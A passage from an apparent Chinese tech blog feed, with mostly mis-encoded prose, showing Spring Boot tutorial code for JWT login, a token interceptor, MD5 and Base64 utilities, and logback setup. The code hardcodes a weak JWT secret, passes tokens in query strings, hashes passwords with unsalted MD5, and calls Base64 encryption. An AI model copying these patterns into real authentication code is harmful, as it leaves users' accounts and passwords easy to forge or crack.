class="hljs-name">context</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">generatorConfiguration</span>&gt;</span></code></pre><p>åˆ›å»º<code>com.sunzy.fmmall.general.GeneralDao</code></p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.general;<span class="hljs-keyword">import</span> tk.mybatis.mapper.common.Mapper;<span class="hljs-keyword">import</span> tk.mybatis.mapper.common.MySqlMapper;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">GeneralDao</span>&lt;<span class="hljs-title">T</span>&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title">Mapper</span>&lt;<span class="hljs-title">T</span>&gt;, <span class="hljs-title">MySqlMapper</span>&lt;<span class="hljs-title">T</span>&gt; </span>&#123;&#125;</code></pre><p>åœ¨pom.xmlä¸­æ·»åŠ é…ç½®æ–‡ä»¶çš„ä½ç½®</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220710225357498.png" alt="image-20220710225357498"></p><p>ä½¿ç”¨æ’ä»¶è¿›è¡Œä»£ç ç”Ÿæˆ</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220710225431382.png" alt="image-20220710225431382"></p><h1 id="JWTå®ç°ç™»å½•æƒé™è®¤è¯"><a href="#JWTå®ç°ç™»å½•æƒé™è®¤è¯" class="headerlink" title="JWTå®ç°ç™»å½•æƒé™è®¤è¯"></a>JWTå®ç°ç™»å½•æƒé™è®¤è¯</h1><h2 id="1-å¯¼å…¥JWTä¾èµ–"><a href="#1-å¯¼å…¥JWTä¾èµ–" class="headerlink" title="1.å¯¼å…¥JWTä¾èµ–"></a>1.å¯¼å…¥JWTä¾èµ–</h2><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.auth0<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>java-jwt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.10.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.jsonwebtoken<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jjwt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre><h2 id="2-ç”Ÿæˆå¯¹åº”çš„tokenå¹¶è¿”å›ç»™å‰ç«¯"><a href="#2-ç”Ÿæˆå¯¹åº”çš„tokenå¹¶è¿”å›ç»™å‰ç«¯" class="headerlink" title="2.ç”Ÿæˆå¯¹åº”çš„tokenå¹¶è¿”å›ç»™å‰ç«¯"></a>2.ç”Ÿæˆå¯¹åº”çš„tokenå¹¶è¿”å›ç»™å‰ç«¯</h2><pre><code class="hljs java"><span class="hljs-comment">// éªŒè¯æˆåŠŸåˆ™ç”Ÿæˆå¯¹åº”çš„token</span><span class="hljs-comment">// ä½¿ç”¨jwtç”Ÿæˆtoken</span>JwtBuilder builder = Jwts.builder();Map&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();map.put(<span class="hljs-string">&quot;key1&quot;</span>, <span class="hljs-string">&quot;value2&quot;</span>);map.put(<span class="hljs-string">&quot;key2&quot;</span>, <span class="hljs-string">&quot;value2&quot;</span>);JwtBuilder jwtBuilder = builder.setSubject(username)    <span class="hljs-comment">//è®¾ç½®subject</span>    .setIssuedAt(<span class="hljs-keyword">new</span> Date())        <span class="hljs-comment">// è®¾ç½®tokenç”Ÿæˆçš„æ—¶é—´</span>    .setId(user.getUserId() + <span class="hljs-string">&quot;&quot;</span>)        <span class="hljs-comment">// è®¾ç½®useridä¸ºtokençš„å”¯ä¸€id</span>    .setClaims(map)                 <span class="hljs-comment">// mapä¸­å¯ä»¥å­˜æ”¾ç”¨æˆ·çš„è§’è‰²å’Œæƒé™ä¿¡æ¯</span>    .setExpiration(<span class="hljs-keyword">new</span> Date(System.currentTimeMillis() + <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span> * <span class="hljs-number">2</span>))               <span class="hljs-comment">// è®¾ç½®tokençš„è¿‡æœŸæ—¶é—´ ä¸ºä¸¤å¤©</span>    .signWith(SignatureAlgorithm.HS256, <span class="hljs-string">&quot;sunzy123456&quot;</span>);<span class="hljs-comment">// è®¾ç½®tokençš„åŠ å¯†æ–¹å¼å’ŒåŠ å¯†å¯†é’¥</span>String token = jwtBuilder.compact();   <span class="hljs-comment">// è·å–token</span><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, token, user);</code></pre><h2 id="3-å‰ç«¯è¿›è¡Œç™»å½•éªŒè¯æ—¶è·å–å¯¹åº”çš„token"><a href="#3-å‰ç«¯è¿›è¡Œç™»å½•éªŒè¯æ—¶è·å–å¯¹åº”çš„token" class="headerlink" title="3.å‰ç«¯è¿›è¡Œç™»å½•éªŒè¯æ—¶è·å–å¯¹åº”çš„token"></a>3.å‰ç«¯è¿›è¡Œç™»å½•éªŒè¯æ—¶è·å–å¯¹åº”çš„token</h2><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220711172838166.png" alt="image-20220711172838166"></p><h2 id="4-JWTè¿›è¡Œtokenè§£æ"><a href="#4-JWTè¿›è¡Œtokenè§£æ" class="headerlink" title="4.JWTè¿›è¡Œtokenè§£æ"></a>4.JWTè¿›è¡Œtokenè§£æ</h2><pre><code class="hljs java"><span class="hljs-keyword">if</span>(token == <span class="hljs-keyword">null</span> || <span class="hljs-string">&quot;&quot;</span>.equals(token))&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;failed&quot;</span>, <span class="hljs-keyword">null</span>);&#125;<span class="hljs-keyword">else</span> &#123;    JwtParser parser = Jwts.parser();    parser.setSigningKey(<span class="hljs-string">&quot;sunzy123456&quot;</span>); <span class="hljs-comment">// å¯†é’¥éœ€è¦ä¸åŠ å¯†æ—¶ä½¿ç”¨çš„ä¸€è‡´</span>    <span class="hljs-keyword">try</span>&#123;        <span class="hljs-comment">// å¦‚æœtokenæ­£ç¡® ä¸”åœ¨æœ‰æ•ˆæœŸå†… åˆ™è§£ææ­£å¸¸å¦åˆ™ä¼šå‡ºç°å¼‚å¸¸</span>        Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token);        Claims body = claimsJws.getBody();  <span class="hljs-comment">// è·å–tokenä¸­çš„ç”¨æˆ·æ•°æ®</span>        String subject = body.getSubject();  <span class="hljs-comment">// è·å–tokenä¸­å‘subject</span>        String key1 = body.get(<span class="hljs-string">&quot;key1&quot;</span>, String.class);  <span class="hljs-comment">/// è·å–æ·»åŠ åœ¨mapä¸­çš„å€¼</span>    &#125;<span class="hljs-keyword">catch</span>(UnsupportedJwtException e)&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;tokenä¸åˆæ³•è¯·é‡æ–°ç™»å½•ï¼&quot;</span>, <span class="hljs-keyword">null</span>);    &#125;<span class="hljs-keyword">catch</span>(ExpiredJwtException e)&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;tokenå·²è¿‡æœŸï¼Œè¯·é‡æ–°ç™»å½•ï¼&quot;</span>, <span class="hljs-keyword">null</span>);    &#125;    <span class="hljs-keyword">catch</span> (Exception e)&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;æœªçŸ¥é”™è¯¯&quot;</span>, <span class="hljs-keyword">null</span>);    &#125;</code></pre><h2 id="5-ä½¿ç”¨æ‹¦æˆªå™¨éªŒè¯token"><a href="#5-ä½¿ç”¨æ‹¦æˆªå™¨éªŒè¯token" class="headerlink" title="5.ä½¿ç”¨æ‹¦æˆªå™¨éªŒè¯token"></a>5.ä½¿ç”¨æ‹¦æˆªå™¨éªŒè¯token</h2><ul><li><p>åˆ›å»ºæ‹¦æˆªå™¨</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.interceptor;<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResStatus;<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResultVO;<span class="hljs-keyword">import</span> io.jsonwebtoken.*;<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.PrintWriter;<span class="hljs-meta">@Component</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CheckTokenInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">HandlerInterceptor</span> </span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;        String token = request.getParameter(<span class="hljs-string">&quot;token&quot;</span>);        <span class="hljs-keyword">if</span> (token == <span class="hljs-keyword">null</span> || <span class="hljs-string">&quot;&quot;</span>.equals(token)) &#123;            doResponse(response, <span class="hljs-string">&quot;è¯·å…ˆç™»å½•ï¼&quot;</span>);            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            JwtParser parser = Jwts.parser();            parser.setSigningKey(<span class="hljs-string">&quot;sunzy123456&quot;</span>); <span class="hljs-comment">// å¯†é’¥éœ€è¦ä¸åŠ å¯†æ—¶ä½¿ç”¨çš„ä¸€è‡´</span>            <span class="hljs-keyword">try</span> &#123;                <span class="hljs-comment">// å¦‚æœtokenæ­£ç¡® ä¸”åœ¨æœ‰æ•ˆæœŸå†… åˆ™è§£ææ­£å¸¸å¦åˆ™ä¼šå‡ºç°å¼‚å¸¸</span>                Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token);                Claims body = claimsJws.getBody();  <span class="hljs-comment">// è·å–tokenä¸­çš„ç”¨æˆ·æ•°æ®</span>                String subject = body.getSubject();  <span class="hljs-comment">// è·å–tokenä¸­å‘subject</span>                String key1 = body.get(<span class="hljs-string">&quot;key1&quot;</span>, String.class);  <span class="hljs-comment">/// è·å–æ·»åŠ åœ¨mapä¸­çš„å€¼</span>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;            &#125; <span class="hljs-keyword">catch</span> (UnsupportedJwtException e) &#123;                doResponse(response,<span class="hljs-string">&quot;tokenä¸åˆæ³•ï¼Œè¯·é‡æ–°ç™»å½•ï¼&quot;</span>);            &#125; <span class="hljs-keyword">catch</span> (ExpiredJwtException e) &#123;                doResponse(response,<span class="hljs-string">&quot;tokenå·²è¿‡æœŸï¼Œè¯·é‡æ–°ç™»å½•ï¼&quot;</span>);            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;                doResponse(response,<span class="hljs-string">&quot;æœªçŸ¥é”™è¯¯ï¼&quot;</span>);            &#125;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        &#125;    &#125;    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span>  <span class="hljs-title">doResponse</span><span class="hljs-params">(HttpServletResponse response, String msg)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;        ResultVO resultVO = <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, msg, <span class="hljs-keyword">null</span>);        String string = JSON.toJSONString(resultVO);        response.setContentType(<span class="hljs-string">&quot;application/json&quot;</span>);        response.setCharacterEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);        PrintWriter writer = response.getWriter();        writer.write(string);        writer.flush();        writer.close();    &#125;&#125;</code></pre></li></ul><ul><li><p>é…ç½®æ‹¦æˆªå™¨</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.config;<span class="hljs-keyword">import</span> com.sunzy.fmmall.interceptor.CheckTokenInterceptor;<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;<span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;<span class="hljs-comment">/**</span><span class="hljs-comment"> * æ‹¦æˆªå™¨çš„é…ç½®ç±»</span><span class="hljs-comment"> */</span><span class="hljs-meta">@Configuration</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InterceptorConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">WebMvcConfigurer</span> </span>&#123;    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> CheckTokenInterceptor checkTokenInterceptor;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> </span>&#123;        <span class="hljs-comment">// registryæ˜¯æ‹¦æˆªå™¨çš„æ³¨å†Œå™¨</span>        <span class="hljs-comment">// å°†è‡ªå·±åˆ›å»ºçš„æ‹¦æˆªå™¨åŠ å…¥è¿›æ¥ å³å¯å®ç°æ‹¦æˆªåŠŸèƒ½</span>        registry.addInterceptor(checkTokenInterceptor)        .addPathPatterns(<span class="hljs-string">&quot;/**&quot;</span>)  <span class="hljs-comment">// æ‹¦æˆªæ‰€æœ‰è·¯å¾„</span>        .excludePathPatterns(<span class="hljs-string">&quot;/user/**&quot;</span>); <span class="hljs-comment">// é™¤äº†ç”¨æˆ·ç™»å½•å’Œæ³¨å†Œè·¯å¾„</span>    &#125;&#125;</code></pre></li></ul><h1 id="åŠ å¯†ä½¿ç”¨åˆ°å·¥å…·ç±»"><a href="#åŠ å¯†ä½¿ç”¨åˆ°å·¥å…·ç±»" class="headerlink" title="åŠ å¯†ä½¿ç”¨åˆ°å·¥å…·ç±»"></a>åŠ å¯†ä½¿ç”¨åˆ°å·¥å…·ç±»</h1><h2 id="1-md5"><a href="#1-md5" class="headerlink" title="1.md5"></a>1.md5</h2><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.fmmall.utils;<span class="hljs-keyword">import</span> java.math.BigInteger;<span class="hljs-keyword">import</span> java.security.MessageDigest;<span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;<span class="hljs-comment">//MD5 ç”Ÿæˆå™¨</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MD5Utils</span> </span>&#123;<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">md5</span><span class="hljs-params">(String password)</span></span>&#123;<span class="hljs-comment">//ç”Ÿæˆä¸€ä¸ªmd5åŠ å¯†å™¨</span><span class="hljs-keyword">try</span> &#123;MessageDigest md = MessageDigest.getInstance(<span class="hljs-string">&quot;MD5&quot;</span>);<span class="hljs-comment">//è®¡ç®—MD5 çš„å€¼</span>md.update(password.getBytes());<span class="hljs-comment">//BigInteger å°†8ä½çš„å­—ç¬¦ä¸² è½¬æˆ16ä½çš„å­—ç¬¦ä¸² å¾—åˆ°çš„å­—ç¬¦ä¸²å½¢å¼æ˜¯å“ˆå¸Œç å€¼</span><span class="hljs-comment">//BigInteger(å‚æ•°1,å‚æ•°2) å‚æ•°1 æ˜¯ 1ä¸ºæ­£æ•° 0ä¸º0 -1ä¸ºè´Ÿæ•°</span><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> BigInteger(<span class="hljs-number">1</span>, md.digest()).toString(<span class="hljs-number">16</span>);&#125; <span class="hljs-keyword">catch</span> (NoSuchAlgorithmException e) &#123;e.printStackTrace();&#125;<span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;&#125;&#125;</code></pre><h2 id="2-base64"><a href="#2-base64" class="headerlink" title="2.base64"></a>2.base64</h2><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.fmmall.utils;<span class="hljs-keyword">import</span> java.util.Base64;<span class="hljs-comment">//base64 åŠ å¯† è§£å¯† æ¿€æ´»é‚®ä»¶çš„æ—¶å€™ ä¸º é‚®ç®±åœ°å€ codeéªŒè¯ç  è¿›è¡ŒåŠ å¯†</span><span class="hljs-comment">//å½“ å›ä¼ å›æ¥å è¿›è¡Œé‚®ç®±åœ°å€ å’Œ code çš„è§£å¯†</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Base64Utils</span> </span>&#123;<span class="hljs-comment">//åŠ å¯†</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">encode</span><span class="hljs-params">(String msg)</span></span>&#123;<span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(msg.getBytes());&#125;<span class="hljs-comment">//è§£å¯†</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">decode</span><span class="hljs-params">(String msg)</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> String(Base64.getDecoder().decode(msg));&#125;&#125;</code></pre><p>â€‹     </p><h1 id="logbackæ—¥å¿—"><a href="#logbackæ—¥å¿—" class="headerlink" title="logbackæ—¥å¿—"></a>logbackæ—¥å¿—</h1><h2 id="æ·»åŠ xmlæ–‡ä»¶"><a href="#æ·»åŠ xmlæ–‡ä»¶" class="headerlink" title="æ·»åŠ xmlæ–‡ä»¶"></a>æ·»åŠ xmlæ–‡ä»¶</h2><p>åœ¨springbooté¡¹ç›®çš„resourceç›®å½•ä¸‹åˆ›å»ºlogback-spring.xmlæ–‡ä»¶</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">appender</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;stdout&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">encoder</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">springProfile</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dev&quot;</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd-HH:mm:ss E&#125; %level [%thread]-%class[%line]: %msg%n<span class="hljs-tag">&lt;/<span class="hljs-name">pattern</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">springProfile</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">springProfile</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;!dev&quot;</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd-HH:mm:ss E&#125; %level [%thread]-%class[%line]: %msg%n<span class="hljs-tag">&lt;/<span class="hljs-name">pattern</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">springProfile</span>&gt;</span>            <span class="hljs-comment">&lt;!--æ—¥å¿—çš„ç¼–ç æ ¼å¼--&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">charset</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">charset</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">encoder</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">appender</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">appender</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;timeFile&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span>        <span class="hljs-comment">&lt;!--TimeBasedRollingPolicy  åŸºäºæ—¶é—´çš„æ»šåŠ¨ç­–ç•¥--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">rollingPolicy</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">fileNamePattern</span>&gt;</span>log/log-%d&#123;yyyy-MM-dd-HH&#125;.log<span class="hljs-tag">&lt;/<span class="hljs-name">fileNamePattern</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">rollingPolicy</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">encoder</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd-HH:mm:ss.SSS&#125; %level [%thread]-%class:%line&gt;&gt;%msg%n<span class="hljs-tag">&lt;/<span class="hljs-name">pattern</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">charset</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">charset</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">encoder</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">appender</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">root</span> <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;info&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">appender-ref</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;stdout&quot;</span>/&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">appender-ref</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;timeFile&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span></code></pre><h2 id="åœ¨sercieå®ç°ç±»åˆ›å»ºLoggerå¯¹è±¡ï¼Œè¾“â¼Šâ½‡å¿—"><a href="#åœ¨sercieå®ç°ç±»åˆ›å»ºLoggerå¯¹è±¡ï¼Œè¾“â¼Šâ½‡å¿—" class="headerlink" title="åœ¨sercieå®ç°ç±»åˆ›å»ºLoggerå¯¹è±¡ï¼Œè¾“â¼Šâ½‡å¿—"></a>åœ¨sercieå®ç°ç±»åˆ›å»ºLoggerå¯¹è±¡ï¼Œè¾“â¼Šâ½‡å¿—</h2><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220719162517298.png" alt="image-20220719162517298"></p><p>æ—¥å¿—ä¼šè¢«è®°å½•åˆ°é¡¹ç›®çš„/logç›®å½•ä¸‹ï¼Œä¸”æ˜¯æŒ‰æ¯æ—¥è®°å½•</p><pre><code class="hljs xml">log/log-%d&#123;yyyy-MM-dd-HH&#125;.log</code></pre>]]></content>
    
    
    <categories>
      
      <category>javaweb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>springboot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>springboot_demo</title>
    <link href="/2022/04/17/springboot-demo/"/>
    <url>/2022/04/17/springboot-demo/</url>
    
    <content type="html"><![CDATA[<h1 id="springboot-demo"><a href="#springboot-demo" class="headerlink" title="springboot demo"></a>springboot demo</h1><p>ä½¿ç”¨springbootæ•´åˆSSMP</p><h2 id="1-é¡¹ç›®éœ€æ±‚"><a href="#1-é¡¹ç›®éœ€æ±‚" class="headerlink" title="1.é¡¹ç›®éœ€æ±‚"></a>1.é¡¹ç›®éœ€æ±‚</h2><p>é¡¹ç›®æœ€ç»ˆå®ç°çš„é¡µé¢</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220417232613669.png" alt="image-20220417232613669"></p><p>â€‹    æ•´ä½“æ¡ˆä¾‹ä¸­éœ€è¦é‡‡ç”¨çš„æŠ€æœ¯å¦‚ä¸‹ï¼š</p><blockquote><ol><li>Daoå¼€å‘â€”â€”â€”â€”æ•´åˆMyBatisPlusï¼Œåˆ¶ä½œæ•°æ®å±‚æµ‹è¯•</li><li>Serviceå¼€å‘â€”â€”â€”â€”åŸºäºMyBatisPlusè¿›è¡Œå¢é‡å¼€å‘ï¼Œåˆ¶ä½œä¸šåŠ¡å±‚æµ‹è¯•ç±»</li><li>Controllerå¼€å‘â€”â€”â€”â€”åŸºäºRestfulå¼€å‘ï¼Œä½¿ç”¨PostManæµ‹è¯•æ¥å£åŠŸèƒ½</li><li>Controllerå¼€å‘â€”â€”â€”â€”å‰åç«¯å¼€å‘åè®®åˆ¶ä½œ</li><li>é¡µé¢å¼€å‘â€”â€”â€”â€”åŸºäºVUE+ElementUIåˆ¶ä½œï¼Œå‰åç«¯è”è°ƒï¼Œé¡µé¢æ•°æ®å¤„ç†ï¼Œé¡µé¢æ¶ˆæ¯å¤„ç†<ul><li>åˆ—è¡¨</li><li>æ–°å¢</li><li>ä¿®æ”¹</li><li>åˆ é™¤</li><li>åˆ†é¡µ</li><li>æŸ¥è¯¢</li></ul></li><li>é¡¹ç›®å¼‚å¸¸å¤„ç†</li><li>æŒ‰æ¡ä»¶æŸ¥è¯¢â€”â€”â€”â€”é¡µé¢åŠŸèƒ½è°ƒæ•´ã€Controllerä¿®æ­£åŠŸèƒ½ã€Serviceä¿®æ­£åŠŸèƒ½</li></ol></blockquote><h2 id="2-åˆ›å»ºspringbootçš„webé¡¹ç›®"><a href="#2-åˆ›å»ºspringbootçš„webé¡¹ç›®" class="headerlink" title="2.åˆ›å»ºspringbootçš„webé¡¹ç›®"></a>2.åˆ›å»ºspringbootçš„webé¡¹ç›®</h2><h3 id="æ–°å»ºæ¨¡å—"><a href="#æ–°å»ºæ¨¡å—" class="headerlink" title="æ–°å»ºæ¨¡å—"></a>æ–°å»ºæ¨¡å—</h3><p><code>File-&gt;new-&gt;module</code></p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220417214418622.png" alt="image-20220417214418622"></p><p>è¿™é‡Œæ²¡ä»€ä¹ˆéœ€è¦æ”¹çš„ï¼Œåªéœ€è¦ä¿®æ”¹ä½¿ç”¨çš„javaç‰ˆæœ¬</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220417214706594.png" alt="image-20220417214706594"></p><p>é€‰æ‹©æ‰€éœ€è¦çš„ä¾èµ–ï¼Œé€‰æ‹©åspringbootå°±å¯ä»¥è‡ªåŠ¨å¯¼å…¥ç›¸å…³åæ ‡ï¼Œæ— éœ€æ‰‹åŠ¨å¯¼å…¥</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220417214851951.png" alt="image-20220417214851951"></p><p>==æ³¨æ„å°†é…ç½®æ–‡ä»¶æ”¹ä¸ºymlç±»å‹==</p><p><strong>application.yml</strong></p><pre><code class="hljs yaml"><span class="hljs-comment"># ä¿®æ”¹é…ç½®å°†tomcatçš„ç«¯å£æ”¹ä¸º80</span><span class="hljs-attr">server:</span> <span class="hljs-attr">port:</span> <span class="hljs-number">80</span></code></pre><h2 id="3-å¼€å‘æµç¨‹"><a href="#3-å¼€å‘æµç¨‹" class="headerlink" title="3.å¼€å‘æµç¨‹"></a>3.å¼€å‘æµç¨‹</h2><h3 id="å®ä½“ç±»å¼€å‘"><a href="#å®ä½“ç±»å¼€å‘" class="headerlink" title="å®ä½“ç±»å¼€å‘"></a>å®ä½“ç±»å¼€å‘</h3><p>æ•°æ®åº“èµ„æº</p><pre><code class="hljs sql"><span class="hljs-comment">-- ----------------------------</span><span class="hljs-comment">-- Table structure for tbl_book</span><span class="hljs-comment">-- ----------------------------</span><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `tbl_book`;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `tbl_book`  (  `id` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,  `type` <span class="hljs-type">varchar</span>(<span class="hljs-number">20</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NULL</span> <span 